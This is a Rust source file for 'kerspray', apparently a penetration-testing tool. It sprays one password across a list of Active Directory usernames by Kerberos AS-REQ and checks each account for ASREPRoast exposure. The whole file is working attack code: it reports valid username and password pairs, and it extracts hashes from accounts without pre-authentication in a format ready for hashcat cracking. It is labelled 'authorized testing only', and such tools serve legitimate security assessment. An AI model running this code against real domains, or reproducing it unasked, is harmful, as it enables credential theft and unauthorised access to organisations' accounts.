// kerspray.rs — Kerberos password spray + ASREPRoast checker
// ASREPRoast: accounts with DONT_REQUIRE_PREAUTH return an AS-REP without
// pre-authentication, exposing an offline-crackable hash (hashcat -m 18200).

use clap::{Arg, Command};
use kerlab::encryption::EncryptionKey;
use kerlab::krbkdcrep::AsRep;
use kerlab::krbkdcreq::{AsReq, KdcOptionsType};
use kerlab::request::{KrbResponse, TcpRequest};
use std::fs::File;
use std::io::{self, BufRead, Write};
use std::thread::sleep;
use std::time::Duration;

const APPLICATION_NAME: &str = "kerspray";

// RFC 4120 §7.5.9 — KDC error codes
const KRB_ERR_C_PRINCIPAL_UNKNOWN: i32 = 6;   // Username does not exist
const KRB_AP_ERR_BAD_INTEGRITY: i32 = 24;      // Wrong password / preauth failed
const KDC_ERR_CLIENT_REVOKED: i32 = 18;        // Account locked or disabled
const KDC_ERR_PREAUTH_REQUIRED: i32 = 25;      // Preauth required = NOT asreproastable

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new(APPLICATION_NAME)
        .version("0.3.0")
        .about("Kerberos password spray + ASREPRoast — authorized testing only")
        .arg(Arg::new("dc").long("dc").value_name("HOST").required(true)
            .help("IP or hostname of the Domain Controller"))
        .arg(Arg::new("port").long("port").value_name("PORT").default_value("88")
            .value_parser(clap::value_parser!(u16))
            .help("Kerberos port on the Domain Controller"))
        .arg(Arg::new("domain").long("domain").value_name("DOMAIN").required(true)
            .help("Windows domain name (e.g. CORP.LOCAL)"))
        .arg(Arg::new("password").long("password").value_name("PASSWORD")
            // Not required when --asreproast-only is set
            .help("Password to spray against all usernames"))
        .arg(Arg::new("file").long("file").value_name("FILE").required(true)
            .help("File containing one username per line"))
        .arg(Arg::new("safe").long("safe").action(clap::ArgAction::SetTrue)
            .help("Stop spraying on first account lockout (KDC error 18)"))
        .arg(Arg::new("delay").long("delay").value_name("MS").default_value("0")
            .value_parser(clap::value_parser!(u64))
            .help("Milliseconds to wait between each attempt"))
        .arg(Arg::new("pause").long("pause").action(clap::ArgAction::SetTrue)
            .help("Pause for Enter after each successful credential find"))
        .arg(Arg::new("asreproast").long("asreproast").action(clap::ArgAction::SetTrue)
            .help("Also check each account for ASREPRoast vulnerability"))
        .arg(Arg::new("asreproast-only").long("asreproast-only").action(clap::ArgAction::SetTrue)
            .help("Only check ASREPRoast, skip password spraying entirely"))
        .arg(Arg::new("hash-file").long("hash-file").value_name("FILE")
            .help("Write ASREPRoast hashes to this file (hashcat -m 18200 format)"))
        .get_matches();

    let ip          = matches.get_one::<String>("dc").unwrap();
    let port        = matches.get_one::<u16>("port").unwrap();
    let domain      = matches.get_one::<String>("domain").unwrap();
    let file_path   = matches.get_one::<String>("file").unwrap();
    let safe_mode   = matches.get_flag("safe");
    let pause_on_hit= matches.get_flag("pause");
    let delay_ms    = *matches.get_one::<u64>("delay").unwrap();
    let do_asreproast      = matches.get_flag("asreproast") || matches.get_flag("asreproast-only");
    let asreproast_only    = matches.get_flag("asreproast-only");
    let hash_file_path     = matches.get_one::<String>("hash-file");

    // Password is required unless --asreproast-only
    let password = if !asreproast_only {
        Some(matches.get_one::<String>("password").ok_or(
            "You must provide --password unless using --asreproast-only"
        )?)
    } else {
        None
    };

    let target = format!("{}:{}", ip, port);
    let kdc_options = vec![KdcOptionsType::Renewable, KdcOptionsType::RenewableOk];

    // Optional hash output file
    let mut hash_writer: Option<Box<dyn Write>> = match hash_file_path {
        Some(path) => Some(Box::new(
            File::create(path).map_err(|e| format!("Cannot create hash file '{}': {}", path, e))?
        )),
        None => None,
    };

    let file = File::open(file_path)
        .map_err(|e| format!("Cannot open '{}': {}", file_path, e))?;

    for (i, line) in io::BufReader::new(file).lines().enumerate() {
        let username = match line {
            Ok(u) if !u.trim().is_empty() => u.trim().to_string(),
            Ok(_) => continue,
            Err(e) => { eprintln!("[!] Line {} read error: {}", i + 1, e); continue; }
        };

        if delay_ms > 0 { sleep(Duration::from_millis(delay_ms)); }

        // ----------------------------------------------------------------
        // PHASE 1 — ASREPRoast check (AS-REQ without pre-authentication)
        // ----------------------------------------------------------------
        if do_asreproast {
            let asrep_request = match AsReq::new(domain, &username, &kdc_options) {
                Ok(r) => r,
                Err(e) => { eprintln!("[!] AS-REQ build failed for '{}': {:?}", username, e); continue; }
            };
            // NOTE: intentionally NO .with_preauth() call here.
            // A KDC that returns AS-REP anyway exposes an offline-crackable blob.

            match TcpRequest::ask_for::<AsRep, String>(&asrep_request, target.clone()) {
                Ok(KrbResponse::Response(asrep)) => {
                    // Account has DONT_REQUIRE_PREAUTH — extract the crackable hash.
                    // The enc_part is split: first 16 bytes = checksum, rest = edata.
                    // Hashcat mode 18200 format:
                    //   $krb5asrep$23$user@DOMAIN:CHECKSUM$EDATA
                    let enc_bytes = &asrep.inner.enc_part.inner.cipher.inner;
                    let (checksum, edata) = enc_bytes.split_at(16.min(enc_bytes.len()));

                    let hash = format!(
                        "$krb5asrep$23${}@{}:{}${}",
                        username,
                        domain,
                        hex::encode(checksum),
                        hex::encode(edata),
                    );

                    println!("[ASREPROAST] {}\\{} is vulnerable!", domain, username);
                    println!("  {}", hash);

                    if let Some(ref mut w) = hash_writer {
                        writeln!(w, "{}", hash)?;
                    }
                }
                Ok(KrbResponse::Error(e)) => {
                    match e.inner.error_code.inner {
                        KRB_ERR_C_PRINCIPAL_UNKNOWN  => { /* will also show in spray phase */ }
                        KDC_ERR_PREAUTH_REQUIRED     => println!("[asreproast] {}\\{} requires preauth — not vulnerable", domain, username),
                        other => eprintln!("[asreproast] {}\\{} unexpected error {}", domain, username, other),
                    }
                }
                Err(e) => eprintln!("[!] ASREPRoast network error for '{}': {:?}", username, e),
            }
        }

        // ----------------------------------------------------------------
        // PHASE 2 — Password spray (AS-REQ with pre-authentication)
        // ----------------------------------------------------------------
        if asreproast_only { continue; }

        let password = password.unwrap(); // safe: checked at startup

        let tgt_request = match AsReq::new(domain, &username, &kdc_options)
            .and_then(|r| r.with_preauth(&EncryptionKey::new_rc4_hmac(password).unwrap()))
        {
            Ok(r) => r,
            Err(e) => { eprintln!("[!] AS-REQ build failed for '{}': {:?}", username, e); continue; }
        };

        match TcpRequest::ask_for::<AsRep, String>(&tgt_request, target.clone()) {
            Ok(KrbResponse::Error(e)) => {
                match e.inner.error_code.inner {
                    KRB_ERR_C_PRINCIPAL_UNKNOWN  => println!("[-] Not found:      {}\\{}", domain, username),
                    KRB_AP_ERR_BAD_INTEGRITY     => println!("[-] Wrong password: {}\\{}", domain, username),
                    KDC_ERR_CLIENT_REVOKED       => {
                        println!("[!] LOCKED/DISABLED: {}\\{}", domain, username);
                        if safe_mode {
                            eprintln!("[!] Safe mode active — aborting spray.");
                            return Ok(());
                        }
                    }
                    other => println!("[?] Error {}: {}\\{}", other, domain, username),
                }
            }
            Ok(KrbResponse::Response(_)) => {
                println!("*******************************************");
                println!("[+] VALID: {}\\{} : {}", domain, username, password);
                println!("*******************************************");
                if pause_on_hit {
                    eprintln!("[*] Press Enter to continue...");
                    io::stdin().read_line(&mut String::new())?;
                }
            }
            Err(e) => eprintln!("[!] Network error for '{}': {:?}", username, e),
        }
    }

    Ok(())
}
